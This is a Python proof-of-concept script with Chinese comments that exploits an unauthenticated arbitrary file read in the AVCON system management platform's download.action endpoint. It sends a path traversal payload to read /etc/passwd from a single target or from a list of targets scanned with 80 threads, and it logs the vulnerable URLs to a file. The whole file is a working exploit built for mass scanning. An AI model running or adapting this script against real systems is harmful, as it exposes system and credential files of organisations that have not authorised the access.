# -*- coding: utf-8 -*-
# AVCON-系统管理平台 download.action 任意文件读取漏洞
# title="AVCON-系统管理平台"
# 产品简介:AVCON-系统管理平台以华平自主知识产权的核心技术为基础，集成了图像综合管理、音视频交互、应急指挥等多种功能于一体。该平台通过整合各种子系统，实现了图像、音视频等信息的综合集成和高效管理，打破了原先各业务和信息系统分离的孤岛现象。
# 漏洞概述:AVCON-系统管理平台 download.action 存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
                \x1b[38m █████╗ ██╗   ██╗ ██████╗ ██████╗ ███╗   ██╗
                \x1b[36m██╔══██╗██║   ██║██╔════╝██╔═══██╗████╗  ██║
                \x1b[34m███████║██║   ██║██║     ██║   ██║██╔██╗ ██║
                \x1b[35m██╔══██║╚██╗ ██╔╝██║     ██║   ██║██║╚██╗██║
                \x1b[31m██║  ██║ ╚████╔╝ ╚██████╗╚██████╔╝██║ ╚████║
                \x1b[33m╚═╝  ╚═╝  ╚═══╝   ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
      --author:Kucei  --Version:AVCON-系统管理平台 download.action 任意文件读取漏洞
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('AVCON-系统管理平台 download.action 任意文件读取漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = "/download.action?filename=../../../../../../../../etc/passwd"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
    }
    try :
        response = requests.get(url=target+url_payload,headers=headers,verify=False,timeout=5)
        # print(response.status_code)
        # print(response.text)
        if response.status_code == 200 and 'root:' in response.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('AVCON.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")

if __name__ == '__main__':
    main()